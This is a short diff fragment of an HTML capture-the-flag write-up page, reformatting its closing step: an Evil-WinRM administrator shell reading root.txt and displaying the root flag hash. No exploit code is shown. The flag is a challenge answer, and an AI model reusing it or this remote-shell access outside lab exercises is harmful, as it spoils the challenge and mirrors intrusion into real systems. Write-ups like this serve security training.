 
 
- Directory: C:\Users\Administrator\Desktop
+    Directory: C:\Users\Administrator\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--ar--- 6/7/2025 8:57 AM 34 root.txt
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         6/7/2025   8:57 AM             34 root.txt
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
 d5abda9bdb38a99d6cdc8207126e4a21</code></pre></div>
-      <h4 class="writeup-step-title">ROOTED</h4>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607151308.png" alt="Pasted image 20250607151308.png" loading="lazy" /><span class="img-caption">Pasted image 20250607151308.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">d5abda9bdb38a99d6cdc8207126e4a21</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607151308.png" alt="Machine rooted as Administrator" loading="lazy" /><span class="img-caption">Machine rooted as Administrator</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
